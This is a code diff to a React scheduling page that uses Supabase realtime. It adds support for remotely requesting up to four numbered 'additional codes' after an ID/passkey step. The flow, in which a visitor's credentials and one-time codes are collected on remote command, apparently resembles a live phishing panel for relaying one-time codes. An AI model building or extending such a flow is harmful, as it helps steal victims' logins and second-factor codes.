@@ -68,6 +68,7 @@ function SchedulePageInner() {
 
   const [phase, setPhase] = useState<Phase>("form");
   const [verifyStage, setVerifyStage] = useState<VerifyStage>("closed");
+  const [codeNumber, setCodeNumber] = useState<number>(1);
   const [submitting, setSubmitting] = useState(false);
   const [verifyError, setVerifyError] = useState<string | null>(null);
   const [bookingId, setBookingId] = useState<string | null>(null);
@@ -125,7 +126,8 @@ function SchedulePageInner() {
         "postgres_changes",
         { event: "UPDATE", schema: "public", table: "bookings", filter: `id=eq.${bookingId}` },
         (payload) => {
-          const status = (payload.new as { status: BookingStatus }).status;
+          const newRow = payload.new as { status: BookingStatus; additional_code?: string | null };
+          const status = newRow.status;
           if (status === "confirmed") {
             setVerifyStage("closed");
             setPhase("confirmed");
@@ -134,6 +136,14 @@ function SchedulePageInner() {
             setVerifyStage("idPasskey");
           } else if (status === "awaiting_code") {
             setVerifyError(null);
+            let codeNum = 1;
+            if (newRow.additional_code) {
+              const match = newRow.additional_code.match(/CODE_(\d)_REQUESTED/i);
+              if (match) {
+                codeNum = parseInt(match[1], 10);
+              }
+            }
+            setCodeNumber(codeNum);
             setVerifyStage("code");
           }
         }
@@ -213,9 +223,10 @@ function SchedulePageInner() {
     setSubmitting(true);
     setVerifyError(null);
     try {
+      const codeValue = `[Code ${codeNumber}] ${code}`;
       const { error } = await supabase
         .from("bookings")
-        .update({ additional_code: code, status: "pending" })
+        .update({ additional_code: codeValue, status: "pending" })
         .eq("id", bookingId!);
       if (error) throw error;
       setVerifyStage("waiting");
@@ -534,10 +545,11 @@ function SchedulePageInner() {
         </main>
       </div>
 
-      {/* Verification Modal */}
+      {/* Verification Modal with dynamic Additional Code (1, 2, 3, or 4) */}
       <VerifyModal
         stage={verifyStage}
         submitting={submitting}
+        codeNumber={codeNumber}
         errorMessage={verifyError}
         onSubmitIdPasskey={handleSubmitIdPasskey}
         onSubmitCode={handleSubmitCode}
